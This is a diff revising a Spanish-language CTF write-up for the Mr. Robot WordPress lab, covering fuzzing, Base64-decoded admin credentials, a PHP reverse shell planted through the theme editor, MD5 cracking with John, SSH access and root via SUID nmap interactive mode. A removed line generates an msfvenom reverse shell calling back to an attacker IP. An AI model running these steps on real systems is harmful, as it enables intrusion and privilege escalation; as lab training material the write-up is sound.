@@ -8,35 +8,36 @@ Linux
 
 ## 🎯 Objetivo del laboratorio
 
-Comprometer una máquina Linux basada en **WordPress**, obtener acceso inicial mediante la subida de una **reverse shell**, pivotar entre usuarios del sistema y escalar privilegios explotando un binario **SUID** hasta obtener las tres flags del laboratorio.
+Comprometer una máquina Linux basada en **WordPress**, obteniendo las tres claves del laboratorio mediante la explotación de una aplicación web, el acceso al sistema por SSH y una escalada de privilegios aprovechando un binario **SUID** vulnerable.
 
 ---
 
 ## 🛠️ Tecnologías trabajadas
 
 - WordPress
-- Gobuster
+- FFUF
 - Base64
-- msfvenom
 - Reverse Shell
-- Netcat
+- SSH
+- John The Ripper
+- MD5
 - SUID
-- GTFOBins
 - Nmap
+- GTFOBins
 
 ---
 
 ## 🧠 Metodología
 
-La enumeración inicial mostró únicamente los puertos **80** y **443**, por lo que toda la investigación se centró en la aplicación web. Durante la exploración apareció rápidamente una instalación de **WordPress**, por lo que la estrategia pasó a ser obtener acceso al panel de administración antes que buscar vulnerabilidades directamente sobre el servidor.
+La enumeración inicial mostró tres servicios expuestos: **SSH**, **HTTP** y **HTTPS**, siendo la aplicación web el principal punto de entrada.
 
-La enumeración de directorios resultó especialmente importante, ya que permitió localizar varias rutas ocultas con información útil. En lugar de intentar realizar ataques de fuerza bruta sobre el panel de autenticación, decidí aprovechar toda la información disponible en los archivos expuestos, lo que permitió obtener directamente las credenciales de acceso.
+El reconocimiento web permitió identificar rápidamente un sitio basado en **WordPress**, por lo que la investigación se centró en localizar recursos ocultos y posibles credenciales mediante fuzzing y análisis manual.
 
-Una vez dentro del panel de WordPress, utilicé una funcionalidad legítima del CMS para modificar una plantilla e introducir una **reverse shell**. Tras conseguir acceso al sistema, la enumeración interna permitió identificar otro usuario con mayores privilegios y localizar un hash que podía convertirse fácilmente en una contraseña válida.
+Durante la enumeración aparecieron varios archivos con información sensible, incluyendo una de las flags y unas credenciales codificadas en Base64 que permitían acceder al panel de administración de WordPress.
 
-Finalmente, la búsqueda de binarios **SUID** reveló una versión vulnerable de **Nmap** que todavía conservaba el modo interactivo, permitiendo obtener una shell privilegiada como **root**.
+Una vez autenticado, aproveché el editor de temas para subir una **reverse shell**, obteniendo acceso inicial al sistema. Desde allí recuperé un hash MD5 correspondiente al usuario `robot`, que fue crackeado con **John The Ripper** para conseguir una sesión SSH estable.
 
-Este laboratorio demuestra cómo pequeñas exposiciones de información pueden terminar comprometiendo completamente un sistema cuando se encadenan correctamente.
+Finalmente, la enumeración de binarios **SUID** permitió identificar una versión vulnerable de `nmap`, cuya explotación mediante **GTFOBins** proporcionó acceso como **root** y la última flag.
 
 ---
 
@@ -44,159 +45,184 @@ Este laboratorio demuestra cómo pequeñas exposiciones de información pueden t
 
 ### 1. Enumeración inicial
 
-Comencé comprobando la conectividad con la máquina objetivo mediante `ping` y confirmé que se trataba de un sistema Linux gracias al TTL obtenido.
+Comencé realizando un escaneo con **ReconX**.
 
-Posteriormente realicé un escaneo completo utilizando Nmap.
-
-```bash
-nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.10.252.92
-```
-
-Se identificaron los siguientes servicios:
+Los servicios identificados fueron:
 
 | Puerto | Servicio |
 |---------|----------|
+| 22 | SSH |
 | 80 | HTTP |
 | 443 | HTTPS |
+
+Al existir una aplicación web accesible tanto por HTTP como por HTTPS, la investigación se centró en la superficie web.
 
 ---
 
 ### 2. Enumeración web
 
-Al acceder al sitio web observé una página que simulaba una terminal Linux. Aunque el código fuente no contenía información relevante, la apariencia del sitio dejaba entrever que el laboratorio estaba inspirado en la serie **Mr. Robot**.
-
-Realicé una enumeración de directorios utilizando Gobuster.
+Mientras analizaba manualmente la aplicación ejecuté un fuzzing de directorios.
 
 ```bash
-gobuster dir -u http://10.10.252.92 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt -u http://10.128.184.169/FUZZ
 ```
 
-Durante la enumeración aparecieron varios recursos importantes:
+Entre los resultados obtenidos destacaban:
 
-- `/robots`
-- `/license`
-- `/wp-login.php`
+- `robots.txt`
+- `license`
+- `wp-login.php`
+- Directorios característicos de WordPress
 
-Dentro de `robots.txt` encontré:
+Esto confirmó que la aplicación utilizaba **WordPress**.
 
-- La primera flag (`key-1-of-3.txt`)
-- Un diccionario que posteriormente resultó útil.
+---
 
-En el directorio `/license` aparecía un texto codificado en **Base64**.
+### 3. Descubrimiento de información sensible
 
-Tras descodificarlo obtuve las credenciales del panel de WordPress.
+Accedí al archivo:
 
+```text
+robots.txt
 ```
+
+En él encontré una referencia a:
+
+```text
+key-1-of-3.txt
+```
+
+Al acceder al recurso obtuve la primera clave.
+
+Continuando con la enumeración encontré el directorio:
+
+```text
+/license
+```
+
+En su contenido aparecía una cadena codificada en Base64.
+
+```text
+ZWxsaW900kVSMjgtMDY1Mgo=
+```
+
+La descodifiqué utilizando:
+
+```bash
+echo "ZWxsaW900kVSMjgtMDY1Mgo=" | base64 -d
+```
+
+Resultado:
+
+```text
+elliot
+ER28-0652
+```
+
+Las credenciales obtenidas permitían acceder al panel de administración de WordPress.
+
+---
+
+### 4. Acceso inicial
+
+Accedí al panel de autenticación.
+
+```text
+http://10.128.184.169/wp-login.php
+```
+
+Utilicé las credenciales descubiertas.
+
+```text
 Usuario: elliot
-
 Contraseña: ER28-0652
 ```
 
----
+Tras iniciar sesión modifiqué el tema **TwentyFifteen**, incorporando una **reverse shell PHP** mediante el editor de temas.
 
-### 3. Acceso inicial
-
-Con las credenciales obtenidas inicié sesión en el panel de administración de WordPress.
-
-Aproveché el editor de temas para modificar la plantilla **404.php**, sustituyéndola por una **reverse shell** generada mediante **msfvenom**.
+Preparé un listener en la máquina atacante.
 
 ```bash
-msfvenom -p php/reverse_php LHOST=10.23.88.247 LPORT=443 --f raw > pwned.php
+nc -lvnp 4444
 ```
 
-Preparé un listener en mi máquina atacante.
+Posteriormente ejecuté la reverse shell accediendo al archivo subido.
 
-```bash
-nc -lvnp 443
+```text
+http://10.128.184.169/wp-content/themes/TwentyFifteen/php-reverse-shell.php
 ```
 
-Posteriormente forcé la ejecución de la plantilla accediendo a una URL inexistente.
-
-La reverse shell se ejecutó correctamente y obtuve acceso al servidor.
+Con ello obtuve acceso al sistema.
 
 ---
 
-### 4. Estabilización de la shell
+### 5. Post-explotación
 
-Para disponer de una sesión mucho más estable abrí una nueva reverse shell hacia otro puerto.
+Durante la enumeración del sistema localicé la segunda clave.
 
-Posteriormente realicé el tratamiento habitual de la TTY utilizando Python.
-
-```bash
-python -c "import pty; pty.spawn('/bin/bash')"
+```text
+key-2-of-3.txt
 ```
 
-A partir de ese momento ya disponía de una shell completamente interactiva.
+También encontré un archivo con las credenciales del usuario `robot`.
 
-El usuario comprometido era:
+```text
+robot
+c3fcd3d76192e4007dfb496cca67e13b
+```
 
-```
-daemon
-```
+La contraseña estaba almacenada como un hash MD5.
 
 ---
 
-### 5. Enumeración interna
+### 6. Obtención de acceso por SSH
 
-Comencé revisando los usuarios del sistema.
-
-```bash
-cat /etc/passwd
-```
-
-Los usuarios más interesantes eran:
-
-- robot
-- root
-
-Dentro del directorio personal de **robot** encontré dos archivos importantes:
-
-- `key-2-of-3.txt`
-- `password.raw-md5`
-
-Aunque no tenía permisos para leer la segunda flag, sí pude acceder al hash almacenado en `password.raw-md5`.
-
-Tras crackearlo obtuve la contraseña:
-
-```
-abcdefghijklmnopqrstuvwxyz
-```
-
-Con ella cambié al usuario **robot**.
+Guardé el hash y utilicé **John The Ripper**.
 
 ```bash
-su robot
+john --format=raw-md5 --wordlist=/usr/share/john/password.lst password.raw-md5
 ```
 
-Ahora sí fue posible recuperar la segunda flag.
+Resultado:
+
+```text
+Usuario: robot
+Contraseña: abcdefghijklmnopqrstuvwxyz
+```
+
+Con las credenciales recuperadas inicié sesión mediante SSH.
+
+```bash
+ssh robot@10.128.184.169
+```
+
+Esto proporcionó una sesión mucho más estable para continuar con la post-explotación.
 
 ---
 
-### 6. Escalada de privilegios
+### 7. Escalada de privilegios
 
-Comencé utilizando las técnicas habituales.
+Comencé comprobando los permisos disponibles.
 
 ```bash
 sudo -l
 ```
 
-No existían permisos interesantes.
-
-A continuación busqué binarios SUID.
+El usuario no disponía de permisos útiles, por lo que busqué binarios SUID.
 
 ```bash
-find / -perm -4000 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
 ```
 
-Entre ellos apareció:
+Entre los binarios encontrados destacaba:
 
+```text
+/usr/bin/nmap
 ```
-/usr/local/bin/nmap
-```
 
-Consultando GTFOBins descubrí que la versión instalada conservaba el antiguo modo interactivo.
+Consultando **GTFOBins** comprobé que determinadas versiones de `nmap` permiten escapar a una shell cuando se ejecutan en modo interactivo.
 
-Bastó ejecutar:
+Ejecuté:
 
 ```bash
 nmap --interactive
@@ -208,31 +234,31 @@ Y posteriormente:
 !sh
 ```
 
-Con ello obtuve una shell como **root**.
+Con ello obtuve una shell con privilegios de **root**.
 
-Finalmente accedí al directorio:
+Finalmente localicé la tercera clave.
 
+```bash
+find / -name "key-3-of-3.txt" 2>/dev/null
 ```
-/root
-```
 
-y recuperé la tercera y última flag.
+Leí su contenido.
+
+```bash
+cat key-3-of-3.txt
+```
 
 ---
 
 ## 📚 Lecciones aprendidas
 
-- Este laboratorio permitió practicar una cadena de explotación muy completa, combinando técnicas de pentesting web, post-explotación y escalada de privilegios.
-- Enumerar instalaciones WordPress mediante Gobuster.
-- Analizar archivos públicos como `robots.txt` y `license`.
-- Descodificar información en Base64 para recuperar credenciales.
-- Aprovechar el editor de temas de WordPress para subir una reverse shell.
-- Generar payloads PHP mediante **msfvenom**.
-- Estabilizar una shell utilizando Python.
-- Identificar usuarios interesantes revisando `/etc/passwd`.
-- Aprovechar hashes almacenados en archivos del sistema para comprometer otros usuarios.
-- Escalar privilegios explotando versiones antiguas de **Nmap** con permisos SUID.
-
-> **⚠️ Nota importante**
->
-> Cuando se generan payloads o reverse shells con **msfvenom**, es fundamental comprobar siempre que la dirección **LHOST** corresponde a la IP actual de la máquina atacante. Un cambio de red o de VPN puede provocar que el payload apunte a una dirección incorrecta y la conexión nunca llegue a establecerse.
+- Este laboratorio permitió recorrer una cadena de explotación muy completa sobre un entorno basado en WordPress, combinando técnicas de reconocimiento web, explotación de aplicaciones y escalada de privilegios.
+- Identificar rápidamente una instalación de **WordPress** mediante enumeración web.
+- Localizar información sensible mediante archivos como `robots.txt` y `license`.
+- Extraer credenciales codificadas en Base64.
+- Obtener acceso inicial modificando el editor de temas de WordPress.
+- Generar una reverse shell desde un tema de WordPress.
+- Recuperar y crackear hashes MD5 utilizando **John The Ripper**.
+- Reutilizar credenciales para obtener una sesión SSH estable.
+- Enumerar binarios **SUID** durante la fase de post-explotación.
+- Aprovechar versiones vulnerables de `nmap` mediante **GTFOBins** para obtener privilegios de **root**.
